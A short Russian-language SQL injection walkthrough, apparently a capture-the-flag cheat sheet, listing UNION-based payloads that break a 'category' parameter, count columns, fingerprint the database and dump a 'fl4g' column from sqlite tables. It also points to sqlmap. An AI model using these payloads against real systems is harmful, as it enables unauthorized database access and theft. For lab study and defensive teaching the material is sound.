
Мощная приложуха для автосканирования и брутфорса БД: https://sqlmap.org

Пример sql-инъекции, извлечение данных из таблицы
```js
Ковычка ломает бекенд, значит не фильтруются данные:
домен/?category='

Чекаем сколько столбцов в таблице, через инкримент ордера 1, 2, 3 и тд, пока не сломается.
Последнее рабочее количество - это количество столбцов в таблице, к которой запрос идет:
домен/?category=' ORDER BY 2-- -

Теперь можно юнионы писать, зная столбцы, чтобы запрос не падал. Тестим(тут 4 столбца):
домен/?category=' UNION SELECT 1,2,3,4-- -

Что за бд?
домен/?category=' UNION SELECT 1,@@version,3,4-- -
домен/?category=' UNION SELECT 1,@@global.version,3,4-- -
домен/?category=' UNION SELECT 1,version(),3,4-- -
домен/?category=' UNION SELECT 1,sqlite_version(),3,4-- -

sqlite 3.34.1 нашлась, чекаем что за таблицы там есть:
домен/?category=' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'-- -

Интересная s3cret, смотрим структуру - столбцы:
домен/?category=' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' AND name='s3cret'-- -

Забираем флаг из столбца нужного:
домен/?category=' UNION SELECT 1,fl4g,3,4 FROM s3cret-- -
```
